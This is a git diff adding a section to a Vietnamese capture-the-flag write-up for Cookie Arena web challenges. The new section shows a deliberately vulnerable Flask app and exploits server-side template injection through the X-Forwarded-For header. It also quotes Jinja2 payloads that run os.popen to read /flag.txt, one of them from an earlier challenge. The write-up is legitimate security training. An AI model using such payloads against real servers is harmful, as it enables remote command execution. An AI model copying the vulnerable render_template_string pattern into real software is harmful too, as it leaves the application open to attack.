@@ -12,6 +12,7 @@
 - [Mass Assignment Profile](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#mass-assignment-profile)
 - [Baby HTTP Method](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#baby-http-method)
 - [What is your name?](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#what-is-your-name)
+- [I Known Your IP]()
 ### HTTP Request Content-Length
 Challenge:
 
@@ -310,7 +311,55 @@ Tiếp theo, khi nội dung trang web là `Hello. What is your name?`. Ý tưở
 => Như vậy đã xác định được trang web dính lỗ hổng `SSTI`. Tôi sẽ chèn payload `{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}`:
 
 ![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image60.png?raw=true)
+### I Known Your IP
 
+![img](61)
+
+Truy cập website:
+
+![img](62)
+
+Đoạn code được thử thách cung cấp: 
+
+from flask import Flask, request, render_template_string
+
+    app = Flask(__name__)
+
+    @app.route("/")
+    def home():    
+        try:
+            client_ip = request.headers.getlist("X-Forwarded-For")[0].split(':')[0]
+        except:
+            client_ip = None
+        if not client_ip:
+            client_ip = request.remote_addr
+        message = f"This page is being accessed from the remote address: {client_ip}"    
+        return render_template_string(message)
+        ## Fix Server Side Template Injection
+        # message = "This page is being accessed from the remote address: {{client_ip}}"
+        # return render_template_string(message, client_ip=client_ip)
+
+    if __name__ == "__main__":
+        app.run(debug=True, host='0.0.0.0', port=1337)
+
+Phân tích đoạn code này, tôi thấy rằng đoạn code `Flask` này có một lỗ hổng `Server-Side Template Injection` (SSTI) khá rõ ràng:
+
+    client_ip = request.headers.getlist("X-Forwarded-For")[0].split(':')[0]
+
+Lấy IP của client từ header `X-Forwarded-For` (nếu có), nếu không thì dùng `request.remote_addr`.
+
+    message = f"This page is being accessed from the remote address: {client_ip}"
+    return render_template_string(message)
+
+Biến `message` là một `f-string` chứa giá trị có thể do người dùng kiểm soát (client_ip từ header), sau đó `message` được truyền trực tiếp vào `render_template_string()`.
+
+Vì `render_template_string()` sử dụng `Jinja2` (template engine mặc định của Flask), tôi có thể thử thêm header `X-Forwarded-For: {{7*7}}` vào request để kiểm tra:
+
+![img](63)
+
+Tiếp theo tôi thay giá trị của `X-Forwarded-For` thành `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}` và tìm được flag:
+
+![img](64)
 
 
 
